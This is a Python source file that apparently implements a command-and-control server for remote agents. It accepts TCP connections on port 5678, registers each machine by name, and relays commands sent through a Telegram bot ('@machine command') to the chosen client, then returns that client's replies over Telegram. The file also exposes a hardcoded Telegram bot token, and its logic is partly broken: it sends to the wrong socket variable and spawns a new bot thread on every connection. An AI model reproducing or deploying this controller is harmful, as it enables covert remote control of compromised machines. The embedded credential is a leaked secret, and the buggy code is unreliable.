import threading, socket, requests, time, json
from funcoes import *
SERVER = '0.0.0.0'
PORT = 5678
clients = {}

global encerrar
encerrar = False
token = "6731238648:AAF0nfYufZRsi9MgkGor1AcCoaxol8jJ9tk"
strURL = f"https://api.telegram.org/bot{token}/"
update_id = None
arquivo_registros = "registros.json"
registros = carregar_registros(arquivo_registros)


def main():
        
    def verificar_conexoes(client):
        global encerrar
        while not encerrar:
            time.sleep(5) 
            try:client.send(b'')
            except:
                #clients.pop(client)
                encerrar = True

    def enviandoclient(cliente, comando):
        try:
            for item in clients:
                if item == cliente:
                        print(cliente, comando)
                        try:
                            client.send(f'{comando}'.encode('utf-8'))
                        except:
                            return

                    
        except:
            return 'Não foi possivel enviar a mensagem ao Agente'

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server.bind((SERVER, PORT))
        server.listen(5)
        print("Recebendo conexões em: ", (SERVER, PORT))
    except:
        return print('\nNão foi possível iniciar o servidor!\n')
        

    while True:        
        def infos(conexao):
            try:
                infomsg = conexao.recv(512).decode('utf-8')
                infomsg = infomsg.split(',')
                return infomsg
            except OSError:
                print(f"Erro ao processar informações do CLIENTE")

        
        def telegrambot():
            def carregar_registros(arquivo_registros):
                try:
                    arquivo = open(arquivo_registros, "r")
                    registros = json.load(arquivo)
                    arquivo.close()
                    return registros
                except FileNotFoundError:
                    return {}

            def salvar_registros(registros, arquivo_registros):
                try:
                    arquivo = open(arquivo_registros, "w")
                    json.dump(registros, arquivo)
                    arquivo.close()
                except OSError:
                    print(f"Erro ao salvar registros: ", OSError)

            def pegar_atualizacao(update_id, strURL):
                link_requisicao = f"{strURL}getUpdates?timeout=100"
                if update_id:
                    link_requisicao = f"{link_requisicao}&offset={update_id + 1}"
                resultado = requests.get(link_requisicao)
                return json.loads(resultado.content)

            token = "6731238648:AAF0nfYufZRsi9MgkGor1AcCoaxol8jJ9tk"
            strURL = f"https://api.telegram.org/bot{token}/"
            update_id = None
            arquivo_registros = "registros.json"
            registros = carregar_registros(arquivo_registros)
                                        
            while True:
                try:
                    atualizacao = pegar_atualizacao(update_id, strURL)

                    mensagens = atualizacao["result"]
                    for mensagem in mensagens:
                        try:
                            update_id = mensagem['update_id']
                            chat_id = mensagem['message']['from']['id']
                            try:comando = mensagem['message']['text']
                            except:comando = "..."
                            
                            if comando[0] == '@':    
                                comando = '/msg ' + comando
                                maquina, comando = tratandomensagem(comando)
                                if maquina in clients:
                                    enviandoclient(maquina, comando)
                                    
                                    def recebclient(client):
                                        while True:
                                            try:
                                                msg = client.recv(512).decode('utf8')
                                                return msg
                                            except:
                                                return 'erro ao tentar receber informações da Maquina'
                                
                                    try: resposta = recebclient(client)
                                    except: resposta = 'não deu mano'

                                    link_de_envio = f"{strURL}sendMessage?chat_id={chat_id}&text={resposta}"
                                    requests.get(link_de_envio)

                                else:
                                    resposta = 'Comando invalido'
                                    link_de_envio = f"{strURL}sendMessage?chat_id={chat_id}&text={resposta}"
                                    requests.get(link_de_envio)

                            else:
                                resposta = 'Comando invalido'
                                link_de_envio = f"{strURL}sendMessage?chat_id={chat_id}&text={resposta}"
                                requests.get(link_de_envio)
                        except: pass
                        
                except OSError: print("Ocorreu um erro... ", OSError)
                salvar_registros(registros, arquivo_registros)
             

        client, addr = server.accept()
        print(f"\nConexão de: {addr}\n")
        infomsg = infos(client)
        clients[infomsg[3]] = client
        for key, value in clients.items():
                print(f'{key}: {value}')

        telegram = threading.Thread(target=telegrambot, args=[], daemon=True)
        conexoes = threading.Thread(target=verificar_conexoes, args=[client], daemon=True)

        telegram.start()
        conexoes.start()
        
        
def tratandomensagem(comando):
    
    comando = comando.split()
    cliente = comando[1]
    del comando[1]
    mensagem = ''
    for i in comando[1:]:
        mensagem += str(i)+' '
    mensagem = mensagem[:-1]
    cliente = cliente.strip('@')
    return (f" {cliente}", mensagem)
    
main()